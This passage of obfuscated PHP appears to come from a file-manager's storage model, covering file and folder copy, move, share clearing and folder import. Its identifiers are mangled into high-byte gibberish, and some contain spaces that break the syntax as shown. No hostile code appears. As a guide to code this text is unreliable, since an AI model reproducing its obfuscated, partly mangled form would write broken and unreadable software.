$_SERVER[íû‘ş´]; $¸±Áá÷Ğ = $this->sourceInfoCache($”§©•éß); $Ü©¨¸îì = $¸±Áá÷Ğ[$œ¾é áï[462]] == $œ¾é áï[88]; $‰„áüÕ™ = $ÌÛ¨—ó† ? $ÌÛ¨—ó† : $¸±Áá÷Ğ[$œ¾é áï[32]]; $‚Äáòêë = $this->fileNameExistAuto($ÀÄ„°ÇÚ, $¸±Áá÷Ğ); if ($Ü©³ÂĞ©) { $this->_childrenAllMake($”§©•éß); if ($Ü©¨¸îì && $‚Äáòêë) { $this->_childrenAllMake($‚Äáòêë); } } if (!$‚Äáòêë) { return $this->_copyCreate($”§©•éß, $ÀÄ„°ÇÚ, $‰„áüÕ™, $É·¨ü‹š); } $á€‹Â¹š = $‚Äáòêë; if ($Ü©¨¸îì) { if ($†ş»™Ò© == REPEAT_RENAME_FOLDER) { $‰„áüÕ™ = $this->fileNameAutoCache($ÀÄ„°ÇÚ, $‰„áüÕ™, $†ş»™Ò©, $Ü©¨¸îì); $á€‹Â¹š = $this->_copyCreate($”§©•éß, $ÀÄ„°ÇÚ, $‰„áüÕ™, $É·¨ü‹š); } else { $Şñäİäá = $this->_childrenList($”§©•éß); foreach ($Şñäİäá as $›»‰¸Æ) { $this->_copy($›»‰¸Æ[$œ¾é áï[181]], $‚Äáòêë, $†ş»™Ò©, $É·¨ü‹š, !1); } } } else { if ($†ş»™Ò© == REPEAT_RENAME || $†ş»™Ò© == REPEAT_RENAME_FOLDER) { $‰„áüÕ™ = $this->fileNameAutoCache($ÀÄ„°ÇÚ, $‰„áüÕ™, $†ş»™Ò©, $Ü©¨¸îì); $á€‹Â¹š = $this->_copyCreate($”§©•éß, $ÀÄ„°ÇÚ, $‰„áüÕ™, $É·¨ü‹š); } else { if ($†ş»™Ò© == REPEAT_REPLACE) { $Ôä—Ş¥Œ = $this->sourceInfoCache($‚Äáòêë); $ì¢„Ÿ‰ = $this->fileHistory($Ôä—Ş¥Œ, $¸±Áá÷Ğ[$œ¾é áï[518]], $¸±Áá÷Ğ[$œ¾é áï[76]]); if ($ì¢„Ÿ‰) { $É·¨ü‹š[$œ¾é áï[607]][] = $¸±Áá÷Ğ[$œ¾é áï[518]]; } } else { if ($†ş»™Ò© == REPEAT_SKIP) { } } } Hook::trigger($œ¾é áï[612], array($œ¾é áï[613], $¸±Áá÷Ğ, 0)); } return $á€‹Â¹š; } private function _copyCreate($üğÍËı¶, $µàŒ›œş, $õ Ë¸ÏÓ, &$Üœ¬æŠ) { $Î¤ü§Ò =& $_SERVER[íû‘ş´]; $Ö«Îş = $this->sourceInfoCache($üğÍËı¶); $¤’¯şßŸ = $this->sourceInfoCache($µàŒ›œş); $Š­ª…ƒá = $this->_makeItemData($Ö«Îş, $¤’¯şßŸ, $õ Ë¸ÏÓ); Hook::trigger($Î¤ü§Ò[614], $Š­ª…ƒá); Hook::trigger($Î¤ü§Ò[615], array($Î¤ü§Ò[616], $Š­ª…ƒá, 0)); $³Ï·öÇÁ = $this->add($Š­ª…ƒá); $ÜÌ”Ì§ = array($Î¤ü§Ò[181] => $³Ï·öÇÁ, $Î¤ü§Ò[32] => $õ Ë¸ÏÓ); $this->_copyApplyMeta($ÜÌ”Ì§, $Üœ¬æŠ); if ($Ö«Îş[$Î¤ü§Ò[462]] != $Î¤ü§Ò[88]) { $Üœ¬æŠ[$Î¤ü§Ò[607]][] = $Ö«Îş[$Î¤ü§Ò[518]]; return $³Ï·öÇÁ; } $à†º¶ûù = array(); $ó´á¤ö¨ = array(); $this->_childrenListAll($üğÍËı¶, $à†º¶ûù); $¬‘ßåÓÑ = count($à†º¶ûù); if ($¬‘ßåÓÑ == 0) { return $³Ï·öÇÁ; } $œöùİÎÉ = $this->sourceInfo($³Ï·öÇÁ); foreach ($à†º¶ûù as $´«ˆ¡ˆ) { $ÀÚ§ÉÄË = $this->_makeItemData($´«ˆ¡ˆ, $œöùİÎÉ, $´«ˆ¡ˆ[$Î¤ü§Ò[32]]); $ÀÚ§ÉÄË[$Î¤ü§Ò[563]] = $´«ˆ¡ˆ[$Î¤ü§Ò[563]]; $ó´á¤ö¨[] = $ÀÚ§ÉÄË; } $this->chunkEventSet($Î¤ü§Ò[617], array($Î¤ü§Ò[618], $Š­ª…ƒá, $¬‘ßåÓÑ)); $this->addAll($ó´á¤ö¨, array(), !1); $Ï‹Öò©Õ = $this->where(array($Î¤ü§Ò[180] => $³Ï·öÇÁ))->select(); $ôÔ¿¥Ïƒ = $this->_childrenMakeRelation($à†º¶ûù, $Ï‹Öò©Õ); $ôÔ¿¥Ïƒ[$üğÍËı¶] = $³Ï·öÇÁ; $‘¡‰’ï = array(); $æÒ ó‡Ÿ = array(); foreach ($Ï‹Öò©Õ as $´«ˆ¡ˆ) { $Ç‡±ßë’ = $´«ˆ¡ˆ[$Î¤ü§Ò[181]]; $ÆÈÌŠ¦İ = $this->_childrenMatch($ôÔ¿¥Ïƒ, $´«ˆ¡ˆ, $œöùİÎÉ); $‘¡‰’ï[] = array($Î¤ü§Ò[181], $Ç‡±ßë’, $Î¤ü§Ò[180], $ÆÈÌŠ¦İ[$Î¤ü§Ò[180]]); $æÒ ó‡Ÿ[] = array($Î¤ü§Ò[181], $Ç‡±ßë’, $Î¤ü§Ò[563], $ÆÈÌŠ¦İ[$Î¤ü§Ò[563]]); $this->_copyApplyMeta($´«ˆ¡ˆ, $Üœ¬æŠ); if ($´«ˆ¡ˆ[$Î¤ü§Ò[462]] != $Î¤ü§Ò[88]) { $Üœ¬æŠ[$Î¤ü§Ò[607]][] = $´«ˆ¡ˆ[$Î¤ü§Ò[518]]; } } $this->chunkEventSet($Î¤ü§Ò[619], array($Î¤ü§Ò[620], $Š­ª…ƒá, $¬‘ßåÓÑ)); $this->saveAll($‘¡‰’ï); $this->chunkEventSet($Î¤ü§Ò[621], array($Î¤ü§Ò[622], $Š­ª…ƒá, $¬‘ßåÓÑ)); $this->saveAll($æÒ ó‡Ÿ); return $³Ï·öÇÁ; } private function _childrenMakeRelation($ïšŠ÷ï, $õ¸Ùâáµ) { $¥³¹Ÿ­ =& $_SERVER[íû‘ş´]; $š±ÑÜÚœ = array(); $˜öå½¥ä = array(); foreach ($ïšŠ÷ï as $ÀØØ©÷£) { $“ó¢İÑ = $ÀØØ©÷£[$¥³¹Ÿ­[32]] . $¥³¹Ÿ­[8] . $ÀØØ©÷£[$¥³¹Ÿ­[563]]; $š±ÑÜÚœ[$“ó¢İÑ] = $ÀØØ©÷£[$¥³¹Ÿ­[181]]; } foreach ($õ¸Ùâáµ as $ÀØØ©÷£) { $“ó¢İÑ = $ÀØØ©÷£[$¥³¹Ÿ­[32]] . $¥³¹Ÿ­[8] . $ÀØØ©÷£[$¥³¹Ÿ­[563]]; $„üªàŸÚ = $š±ÑÜÚœ[$“ó¢İÑ]; $˜öå½¥ä[$„üªàŸÚ] = $ÀØØ©÷£[$¥³¹Ÿ­[181]]; } return $˜öå½¥ä; } private function _childrenMatch($ŞÃ—§¢‰, $¢ı”ÕÄ, $´Ü­ƒ¡”) { $ìü±Šû =& $_SERVER[íû‘ş´]; $¸š÷º÷µ = $´Ü­ƒ¡”[$ìü±Šû[563]]; $Ú‰÷±¾ = $this->parentLevelArray($¢ı”ÕÄ[$ìü±Šû[563]]); foreach ($Ú‰÷±¾ as $ã‘ä…Ã) { if (isset($ŞÃ—§¢‰[$ã‘ä…Ã])) { $¸š÷º÷µ .= $ŞÃ—§¢‰[$ã‘ä…Ã] . $ìü±Šû[623]; } } $¸š÷º÷µ = rtrim($¸š÷º÷µ, $ìü±Šû[50]) . $ìü±Šû[50]; $®ÆÆçÆ = $this->parentLevelArray($¸š÷º÷µ); $•³É¨ò¢ = $®ÆÆçÆ[count($®ÆÆçÆ) - 1]; return array($ìü±Šû[180] => $•³É¨ò¢, $ìü±Šû[563] => $¸š÷º÷µ); } private function _makeItemData($íİûÅ»Å, $‡Èùá¯˜, $­¤³½Š‰) { $µ¨åŒ›ñ =& $_SERVER[íû‘ş´]; $ÍËÖİì = array($µ¨åŒ›ñ[624] => $íİûÅ»Å[$µ¨åŒ›ñ[462]], $µ¨åŒ›ñ[471] => $­¤³½Š‰, $µ¨åŒ›ñ[625] => $íİûÅ»Å[$µ¨åŒ›ñ[463]] ? $íİûÅ»Å[$µ¨åŒ›ñ[463]] : $µ¨åŒ›ñ[12], $µ¨åŒ›ñ[519] => $íİûÅ»Å[$µ¨åŒ›ñ[518]] ? $íİûÅ»Å[$µ¨åŒ›ñ[518]] : 0, $µ¨åŒ›ñ[595] => $íİûÅ»Å[$µ¨åŒ›ñ[76]] ? $íİûÅ»Å[$µ¨åŒ›ñ[76]] : 0, $µ¨åŒ›ñ[626] => intval($‡Èùá¯˜[$µ¨åŒ›ñ[178]]), $µ¨åŒ›ñ[627] => intval($‡Èùá¯˜[$µ¨åŒ›ñ[548]]), $µ¨åŒ›ñ[628] => intval(USER_ID), $µ¨åŒ›ñ[629] => intval(USER_ID), $µ¨åŒ›ñ[454] => intval($‡Èùá¯˜[$µ¨åŒ›ñ[181]]), $µ¨åŒ›ñ[630] => $‡Èùá¯˜[$µ¨åŒ›ñ[563]] . $‡Èùá¯˜[$µ¨åŒ›ñ[181]] . $µ¨åŒ›ñ[50], $µ¨åŒ›ñ[475] => $íİûÅ»Å[$µ¨åŒ›ñ[85]] ? $íİûÅ»Å[$µ¨åŒ›ñ[85]] : time(), $µ¨åŒ›ñ[481] => 0, $µ¨åŒ›ñ[631] => $µ¨åŒ›ñ[12]); return $ÍËÖİì; } private function _copyApplyMeta($¶áÚªÈ÷, &$÷ÁòŒ¡Û) { $††Åû” =& $_SERVER[íû‘ş´]; $ë£éí‹Ö = $¶áÚªÈ÷[$††Åû”[181]]; $£üÂ³šÉ = $¶áÚªÈ÷[$††Åû”[32]]; if (!isset($¶áÚªÈ÷[$††Åû”[632]]) || !$¶áÚªÈ÷[$††Åû”[632]] || $¶áÚªÈ÷[$††Åû”[632]] == $††Åû”[212]) { $÷ÁòŒ¡Û[$††Åû”[609]][] = array($††Åû”[181], $ë£éí‹Ö, $††Åû”[632], short_id($ë£éí‹Ö)); } if (Input::check($£üÂ³šÉ, $††Åû”[633])) { $÷ÁòŒ¡Û[$††Åû”[608]][] = array($††Åû”[181] => $ë£éí‹Ö, $††Åû”[94] => $††Åû”[515], $††Åû”[418] => str_replace($††Åû”[53], $††Åû”[12], Pinyin::get($£üÂ³šÉ))); $÷ÁòŒ¡Û[$††Åû”[608]][] = array($††Åû”[181] => $ë£éí‹Ö, $††Åû”[94] => $††Åû”[514], $††Åû”[418] => Pinyin::get($£üÂ³šÉ, $††Åû”[634])); } $÷ÁòŒ¡Û[$††Åû”[608]][] = array($††Åû”[181] => $ë£éí‹Ö, $††Åû”[94] => $††Åû”[494], $††Åû”[418] => KodSort::makeStr($£üÂ³šÉ)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($ñ¹¯Ö’Ÿ) { $¡Š×ö„Š =& $_SERVER[íû‘ş´]; $—æÉ…ê = $this->sourceInfo($ñ¹¯Ö’Ÿ); $´˜§óÙ’ = $¡Š×ö„Š[635]; $µá¦ËÙ = array($¡Š×ö„Š[563] => array($¡Š×ö„Š[590], $—æÉ…ê[$¡Š×ö„Š[563]] . $ñ¹¯Ö’Ÿ . $¡Š×ö„Š[591]), $¡Š×ö„Š[482] => $this->targetIsDelete); $îÊñ³Ò = $this->field($´˜§óÙ’)->where($µá¦ËÙ)->select(); if (!$îÊñ³Ò) { return; } $îÊñ³Ò = array_to_keyvalue($îÊñ³Ò, $¡Š×ö„Š[181]); foreach ($îÊñ³Ò as $¾øÏ¼á) { $ï¡ªÈ°– = $¾øÏ¼á[$¡Š×ö„Š[180]]; $ñ¹¯Ö’Ÿ = $¾øÏ¼á[$¡Š×ö„Š[181]]; if (!isset($this->_childrenListCache[$ñ¹¯Ö’Ÿ]) && $¾øÏ¼á[$¡Š×ö„Š[462]] == $¡Š×ö„Š[88]) { $this->_childrenListCache[$ñ¹¯Ö’Ÿ] = array(); } if (!isset($this->_childrenListCache[$ï¡ªÈ°–])) { $this->_childrenListCache[$ï¡ªÈ°–] = array(); } $this->_childrenListCache[$ï¡ªÈ°–][$ñ¹¯Ö’Ÿ] = $¾øÏ¼á; $this->_childrenItemCache[$ñ¹¯Ö’Ÿ] = $¾øÏ¼á; } } private function _childrenListAll($‚ÈêÇÚÂ, &$¡ã§ÊÏÈ) { $”Ê¥Œã =& $_SERVER[íû‘ş´]; if (!isset($this->_childrenListCache[$‚ÈêÇÚÂ])) { return; } $Ç£â¿›É = $this->_childrenListCache[$‚ÈêÇÚÂ]; foreach ($Ç£â¿›É as $„şÊ•¾ò => $ì¨ÍŸÊÛ) { $¡ã§ÊÏÈ[$„şÊ•¾ò] = $ì¨ÍŸÊÛ; if ($ì¨ÍŸÊÛ[$”Ê¥Œã[462]] == $”Ê¥Œã[88]) { $this->_childrenListAll($„şÊ•¾ò, $¡ã§ÊÏÈ); } } } private function sourceInfoCache($Àî¼ˆùÁ) { if (isset($this->_childrenItemCache[$Àî¼ˆùÁ])) { return $this->_childrenItemCache[$Àî¼ˆùÁ]; } return $this->sourceInfo($Àî¼ˆùÁ); } private function _childrenList($ëíİÙöá) { if (isset($this->_childrenListCache[$ëíİÙöá])) { return $this->_childrenListCache[$ëíİÙöá]; } return $this->_childrenListSelect($ëíİÙöá); } private function _childrenListSelect($ÄĞÈñÖÈ) { $ô‡å“–À =& $_SERVER[íû‘ş´]; $é÷ä­ã = array($ô‡å“–À[180] => $ÄĞÈñÖÈ, $ô‡å“–À[482] => $this->targetIsDelete); $ ¤ÚÙªè = $this->where($é÷ä­ã)->select(); $ ¤ÚÙªè = $ ¤ÚÙªè ? $ ¤ÚÙªè : array(); $ùñ¥Ãú± = array_to_keyvalue($ ¤ÚÙªè, $ô‡å“–À[181]); $this->_childrenListCache[$ÄĞÈñÖÈ] = $ùñ¥Ãú±; foreach ($ùñ¥Ãú± as $ÄĞÈñÖÈ => $º÷Ì»·ô) { $this->_childrenItemCache[$ÄĞÈñÖÈ] = $º÷Ì»·ô; } return $ùñ¥Ãú±; } private function fileNameExistAuto($±ÜÀ¡Šâ, $¯öÔÚ) { $Í»ºü™ =& $_SERVER[íû‘ş´]; if ($¯öÔÚ[$Í»ºü™[482]] == $Í»ºü™[88]) { return $this->fileNameExist($±ÜÀ¡Šâ, $¯öÔÚ[$Í»ºü™[32]]); } return $this->fileNameExistCache($±ÜÀ¡Šâ, $¯öÔÚ[$Í»ºü™[32]]); } private function fileNameExistCache($²›³ø­Ø, $¨ºĞ–÷õ) { $èŠ²’… =& $_SERVER[íû‘ş´]; $¨ºĞ–÷õ = strtolower($¨ºĞ–÷õ); $û†ÀÁå› = $this->_childrenList($²›³ø­Ø); foreach ($û†ÀÁå› as $Ÿæİ­ ) { if ($¨ºĞ–÷õ == strtolower($Ÿæİ­ [$èŠ²’…[32]])) { return $Ÿæİ­ [$èŠ²’…[181]]; } } return !1; } private function fileNameAutoCache($ÙÁôó±, $ùøíÎ…è, $¬í¸ĞÚ¹, $åÂíñó—) { $òÇµ²Î =& $_SERVER[íû‘ş´]; $Ø©‘îÃ = $this->_childrenList($ÙÁôó±); $Ì²¿ »ó = array_to_keyvalue($Ø©‘îÃ, $òÇµ²Î[12], $òÇµ²Î[32]); return $this->fileNameAutoGet($Ì²¿ »ó, $ùøíÎ…è, $¬í¸ĞÚ¹, $åÂíñó—); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($ª§Ö¶¼, $õ·¶àÆ§, $ÖŸşŠµ± = REPEAT_REPLACE, $ÑÉ¤ˆùÃ = '') { $õ“‚Ù®ü =& $_SERVER[íû‘ş´]; $ÎíÈÊ» = $this->sourceInfo($ª§Ö¶¼); $½ÆñË¦º = $this->sourceInfo($õ·¶àÆ§); if ($ÎíÈÊ»[$õ“‚Ù®ü[180]] == $½ÆñË¦º[$õ“‚Ù®ü[181]]) { if ($ÎíÈÊ»[$õ“‚Ù®ü[482]] == $õ“‚Ù®ü[88]) { Model($õ“‚Ù®ü[480])->restore(array($ª§Ö¶¼)); } if (!$ÑÉ¤ˆùÃ || $ÑÉ¤ˆùÃ == $ÎíÈÊ»[$õ“‚Ù®ü[32]]) { return $ª§Ö¶¼; } } $£²Ğó·Ó = $this->pathInfoMore($ª§Ö¶¼); if ($this->isParentOf($ª§Ö¶¼, $õ·¶àÆ§)) { return !1; } if (!$ÎíÈÊ» || !$½ÆñË¦º || $½ÆñË¦º[$õ“‚Ù®ü[462]] != $õ“‚Ù®ü[88]) { return !1; } Hook::trigger($õ“‚Ù®ü[636], $£²Ğó·Ó); $this->targetIsDelete = intval($ÎíÈÊ»[$õ“‚Ù®ü[482]]); if ($ÎíÈÊ»[$õ“‚Ù®ü[180]] == $õ·¶àÆ§ && $ÑÉ¤ˆùÃ != $ÎíÈÊ»[$õ“‚Ù®ü[32]]) { $åñ”Å™ç = $this->fileNameExist($õ·¶àÆ§, $ÑÉ¤ˆùÃ); if ($åñ”Å™ç && $ÎíÈÊ»[$õ“‚Ù®ü[462]] == $õ“‚Ù®ü[212]) { $¨ïÖ‡° = $this->sourceInfo($åñ”Å™ç); $œ¸¶˜Ê = $this->fileHistory($¨ïÖ‡°, $ÎíÈÊ»[$õ“‚Ù®ü[518]], $ÎíÈÊ»[$õ“‚Ù®ü[76]]); if (!$œ¸¶˜Ê) { Model($õ“‚Ù®ü[521])->remove($ÎíÈÊ»[$õ“‚Ù®ü[518]]); } $this->removeNow($ª§Ö¶¼, !1); $this->folderSizeReset($õ·¶àÆ§); Hook::trigger($õ“‚Ù®ü[637], $£²Ğó·Ó); return $åñ”Å™ç; } } $» ìÛ£Ø = $ÑÉ¤ˆùÃ ? $ÑÉ¤ˆùÃ : $ÎíÈÊ»[$õ“‚Ù®ü[32]]; $this->lockMoveStart($ª§Ö¶¼); $this->lockWriteStart($õ·¶àÆ§, $» ìÛ£Ø); $‰‚²³Êõ = array($õ“‚Ù®ü[607] => array(), $õ“‚Ù®ü[638] => !1); $this->clearShare($ª§Ö¶¼, $õ·¶àÆ§); $İ­ÇÉàÏ = $this->fileNameExistAuto($õ·¶àÆ§, $ÎíÈÊ»); $ÄÂşú˜ = $this->_move($ª§Ö¶¼, $õ·¶àÆ§, $ÖŸşŠµ±, $‰‚²³Êõ, $ÑÉ¤ˆùÃ); $this->sourceCacheClear(); if ($ÎíÈÊ»[$õ“‚Ù®ü[462]] == $õ“‚Ù®ü[88] && $İ­ÇÉàÏ) { $this->folderSizeResetChildren($ÄÂşú˜); } Model($õ“‚Ù®ü[214])->linkAdd($‰‚²³Êõ[$õ“‚Ù®ü[607]]); if ($İ­ÇÉàÏ && $‰‚²³Êõ[$õ“‚Ù®ü[638]]) { $this->removeNow($ª§Ö¶¼, !1); } $this->lockMoveEnd($ª§Ö¶¼); $this->lockWriteEnd($õ·¶àÆ§, $» ìÛ£Ø); $this->folderSizeReset($ÎíÈÊ»[$õ“‚Ù®ü[180]]); $this->folderSizeReset($õ·¶àÆ§); $²æ´¨…“ = array($ÎíÈÊ»[$õ“‚Ù®ü[180]], $õ·¶àÆ§); if ($ÎíÈÊ»[$õ“‚Ù®ü[462]] == $õ“‚Ù®ü[88]) { $²æ´¨…“[] = $ª§Ö¶¼; } $this->updateModifyTime($²æ´¨…“); Model($õ“‚Ù®ü[611])->eventMove($ª§Ö¶¼, $ÎíÈÊ»[$õ“‚Ù®ü[180]], $õ·¶àÆ§); Hook::trigger($õ“‚Ù®ü[637], $£²Ğó·Ó); return $ÄÂşú˜; } private function _move($…§‰ó¹¼, $¤îúÇ½Ø, $©İşÒ³‡, &$ƒ˜ÆöÅ‚, $çìã¨ş‡ = '') { $ıœ÷Û¤ =& $_SERVER[íû‘ş´]; $éÖ±·Æ— = $this->sourceInfo($…§‰ó¹¼); $„ò¢£¿œ = $éÖ±·Æ—[$ıœ÷Û¤[462]] == $ıœ÷Û¤[88]; $º‘ùÆ™Ì = $çìã¨ş‡ ? $çìã¨ş‡ : $éÖ±·Æ—[$ıœ÷Û¤[32]]; $‘ÅªëÙ¦ = $this->fileNameExistAuto($¤îúÇ½Ø, $éÖ±·Æ—); $this->lockMoveStart($…§‰ó¹¼); $this->lockWriteStart($¤îúÇ½Ø, $º‘ùÆ™Ì); if (!$‘ÅªëÙ¦) { return $this->_moveForce($…§‰ó¹¼, $¤îúÇ½Ø, $º‘ùÆ™Ì); } $Ñ€×ª‘ = $‘ÅªëÙ¦; $øùÁ‹™™ = !1; if ($„ò¢£¿œ) { if ($©İşÒ³‡ == REPEAT_RENAME_FOLDER) { $º‘ùÆ™Ì = $this->fileNameAuto($¤îúÇ½Ø, $º‘ùÆ™Ì, $©İşÒ³‡, $„ò¢£¿œ); $Ñ€×ª‘ = $this->_moveForce($…§‰ó¹¼, $¤îúÇ½Ø, $º‘ùÆ™Ì); } else { if ($©İşÒ³‡ == REPEAT_RENAME_FOLDER) { $©İşÒ³‡ = REPEAT_RENAME; } $à±ÙÔä– = $this->_childrenListSelect($…§‰ó¹¼); foreach ($à±ÙÔä– as $ê–üó ®) { $this->_move($ê–üó ®[$ıœ÷Û¤[181]], $‘ÅªëÙ¦, $©İşÒ³‡, $ƒ˜ÆöÅ‚); } $øùÁ‹™™ = !0; } } else { if ($©İşÒ³‡ == REPEAT_SKIP) { $øùÁ‹™™ = !0; } else { if ($©İşÒ³‡ == REPEAT_RENAME || $©İşÒ³‡ == REPEAT_RENAME_FOLDER) { $º‘ùÆ™Ì = $this->fileNameAuto($¤îúÇ½Ø, $º‘ùÆ™Ì, $©İşÒ³‡, $„ò¢£¿œ); $Ñ€×ª‘ = $this->_moveForce($…§‰ó¹¼, $¤îúÇ½Ø, $º‘ùÆ™Ì); } else { if ($©İşÒ³‡ == REPEAT_REPLACE) { $Ë´¯èç¥ = $this->sourceInfoCache($‘ÅªëÙ¦); $æıŞ®Å = $this->fileHistory($Ë´¯èç¥, $éÖ±·Æ—[$ıœ÷Û¤[518]], $éÖ±·Æ—[$ıœ÷Û¤[76]]); $øùÁ‹™™ = !0; if ($æıŞ®Å) { $ƒ˜ÆöÅ‚[$ıœ÷Û¤[607]][] = $éÖ±·Æ—[$ıœ÷Û¤[518]]; } } } } } if ($øùÁ‹™™ && !$ƒ˜ÆöÅ‚[$ıœ÷Û¤[638]]) { $ƒ˜ÆöÅ‚[$ıœ÷Û¤[638]] = !0; } return $Ñ€×ª‘; } private function _moveForce($ñ„Üä×Í, $²‚ï½êî, $“ÜÇÍÂ) { $³†àÂÇ± =& $_SERVER[íû‘ş´]; $µ´›Ã× = $this->sourceInfo($ñ„Üä×Í); $Ñˆ–ÉÚ« = $this->sourceInfo($²‚ï½êî); $Æƒ‚úÍû = $µ´›Ã×[$³†àÂÇ±[462]] == $³†àÂÇ±[88]; $£Ø‡öŸ‘ = array($³†àÂÇ±[454] => $Ñˆ–ÉÚ«[$³†àÂÇ±[181]], $³†àÂÇ±[630] => $Ñˆ–ÉÚ«[$³†àÂÇ±[563]] . $Ñˆ–ÉÚ«[$³†àÂÇ±[181]] . $³†àÂÇ±[50], $³†àÂÇ±[626] => $Ñˆ–ÉÚ«[$³†àÂÇ±[178]], $³†àÂÇ±[627] => $Ñˆ–ÉÚ«[$³†àÂÇ±[548]], $³†àÂÇ±[629] => USER_ID, $³†àÂÇ±[471] => $“ÜÇÍÂ); $©¾›ğ‚ş = $µ´›Ã×[$³†àÂÇ±[178]] == SourceModel::TYPE_GROUP && $Ñˆ–ÉÚ«[$³†àÂÇ±[178]] == SourceModel::TYPE_GROUP && $µ´›Ã×[$³†àÂÇ±[548]] == $Ñˆ–ÉÚ«[$³†àÂÇ±[548]]; if (!$©¾›ğ‚ş && $this->moveClearAuth) { Model($³†àÂÇ±[545])->authClear($ñ„Üä×Í); } $ÑÄàéØÍ = $µ´›Ã×[$³†àÂÇ±[482]] == $³†àÂÇ±[88] && $Ñˆ–ÉÚ«[$³†àÂÇ±[482]] != $³†àÂÇ±[88]; if ($ÑÄàéØÍ) { $£Ø‡öŸ‘[$³†àÂÇ±[481]] = 0; } if ($Æƒ‚úÍû) { $­·±¨Ğ = array($³†àÂÇ±[630] => array($³†àÂÇ±[590], $µ´›Ã×[$³†àÂÇ±[563]] . $µ´›Ã×[$³†àÂÇ±[181]] . $³†àÂÇ±[591])); $¸¼ŒÈƒ» = $µ´›Ã×[$³†àÂÇ±[563]] . $µ´›Ã×[$³†àÂÇ±[181]] . $³†àÂÇ±[50]; $³ìğ…¡ˆ = $Ñˆ–ÉÚ«[$³†àÂÇ±[563]] . $Ñˆ–ÉÚ«[$³†àÂÇ±[181]] . $³†àÂÇ±[50] . $µ´›Ã×[$³†àÂÇ±[181]] . $³†àÂÇ±[50]; $©Òìç–€ = array($³†àÂÇ±[630] => array($³†àÂÇ±[639], "\162\x65\160\154\141\143\145\x28\160\141\162\x65\x6e\164\114\145\166\x65\154\54\x27{$¸¼ŒÈƒ»}\x27\x2c\47{$³ìğ…¡ˆ}\x27\x29"), $³†àÂÇ±[626] => $Ñˆ–ÉÚ«[$³†àÂÇ±[178]], $³†àÂÇ±[627] => $Ñˆ–ÉÚ«[$³†àÂÇ±[548]]); if ($ÑÄàéØÍ) { $©Òìç–€[$³†àÂÇ±[481]] = 0; } $this->where($­·±¨Ğ)->data($©Òìç–€)->save(); } $this->where(array($³†àÂÇ±[468] => $ñ„Üä×Í))->data($£Ø‡öŸ‘)->save(); return $ñ„Üä×Í; } private function clearShare($¹éØ®Ÿá, $±äÏôŠõ) { $ÁÑ¯ ±â =& $_SERVER[íû‘ş´]; $¬°¶˜¨ü = $this->sourceInfo($¹éØ®Ÿá); $§ô¿äæ = $this->sourceInfo($±äÏôŠõ); if ($¬°¶˜¨ü[$ÁÑ¯ ±â[548]] == $§ô¿äæ[$ÁÑ¯ ±â[548]] && $¬°¶˜¨ü[$ÁÑ¯ ±â[178]] == $ÁÑ¯ ±â[640]) { return; } $ú¥ûãÃ³ = array($ÁÑ¯ ±â[563] => array($ÁÑ¯ ±â[590], $¬°¶˜¨ü[$ÁÑ¯ ±â[563]] . $¹éØ®Ÿá . $ÁÑ¯ ±â[591])); $™ˆ“ÀäÑ = $this->field($ÁÑ¯ ±â[468])->where($ú¥ûãÃ³)->getField($ÁÑ¯ ±â[181], !0); if (!$™ˆ“ÀäÑ) { return; } $ú¥ûãÃ³ = array($ÁÑ¯ ±â[181] => array($ÁÑ¯ ±â[7], $™ˆ“ÀäÑ), $ÁÑ¯ ±â[641] => 1); $¡·Œ·£« = Model($ÁÑ¯ ±â[642])->field($ÁÑ¯ ±â[643])->where($ú¥ûãÃ³)->select(); if (!$¡·Œ·£«) { return; } $¡·Œ·£« = array_to_keyvalue($¡·Œ·£«, $ÁÑ¯ ±â[12], $ÁÑ¯ ±â[643]); $ú¥ûãÃ³ = array($ÁÑ¯ ±â[643] => array($ÁÑ¯ ±â[7], $¡·Œ·£«)); Model($ÁÑ¯ ±â[642])->where($ú¥ûãÃ³)->save(array($ÁÑ¯ ±â[641] => 0)); Model($ÁÑ¯ ±â[644])->where($ú¥ûãÃ³)->delete(); } public function copyFolderFromIO($ÚËÔèÔú, $­é‰ˆØ, $Ÿßßô¾ş, $¸ß¥â¯Ÿ, $·òÒÛş‡, $¥å¾²†š = false) { $†ïäŠ€’ =& $_SERVER[íû‘ş´]; $‡×³ã½ = array($†ïäŠ€’[608] => array(), $†ïäŠ€’[609] => array(), $†ïäŠ€’[607] => array(), $†ïäŠ€’[645] => array()); $¦Š¢ñÚú = $¥å¾²†š ? $¥å¾²†š : $ÚËÔèÔú->pathThis($­é‰ˆØ); $ÃãûØÖó = $this->fileNameExist($Ÿßßô¾ş, $¦Š¢ñÚú); $Û»õÁÁÃ = $this->mkdir($Ÿßßô¾ş, $¦Š¢ñÚú, $¸ß¥â¯Ÿ); if (!$ÃãûØÖó || $¸ß¥â¯Ÿ == REPEAT_RENAME_FOLDER) { $¸ß¥â¯Ÿ = !1; } if ($ÃãûØÖó) { $this->_childrenAllMake($ÃãûØÖó); } Hook::trigger($†ïäŠ€’[646]); $this->_copyChildTo($ÚËÔèÔú, $­é‰ˆØ, $Û»õÁÁÃ, $¸ß¥â¯Ÿ, $‡×³ã½, $·òÒÛş‡); Hook::trigger($†ïäŠ€’[647]); if ($Û»õÁÁÃ) { $this->folderSizeResetChildren($Û»õÁÁÃ); } $this->_childrenListClear(); Model($†ïäŠ€’[610])->addAll($‡×³ã½[$†ïäŠ€’[608]], array(), !0); Model($†ïäŠ€’[611])->eventCopy($Û»õÁÁÃ); $this->saveAll($‡×³ã½[$†ïäŠ€’[609]]); Model($†ïäŠ€’[521])->linkAdd($‡×³ã½[$†ïäŠ€’[607]]); Model($†ïäŠ€’[521])->remove($‡×³ã½[$†ïäŠ€’[645]]); $this->folderSizeReset($Ÿßßô¾ş); $this->updateModifyTime($Ÿßßô¾ş); return $Û»õÁÁÃ; } private function _copyChildTo($÷¤¾À½Ç, $—²€šİ†, $Ş°ƒÛ», $¯à®Ø’¾, &$ÎÚï¡œõ, $³á–Ã°İ) { $ğÏ¥ğ  =& $_SERVER[íû‘ş´]; $—šÛÛëÆ = $this->sourceInfoCache($Ş°ƒÛ»); $ÑöÇ¥á = $÷¤¾À½Ç->listPath($—²€šİ†); $ÑöÇ¥á = $ÑöÇ¥á ? $ÑöÇ¥á : array($ğÏ¥ğ [83] => array(), $ğÏ¥ğ [82] => array()); $¥‡õÆ = array_merge($ÑöÇ¥á[$ğÏ¥ğ [83]], $ÑöÇ¥á[$ğÏ¥ğ [82]]); $àÚá’ = 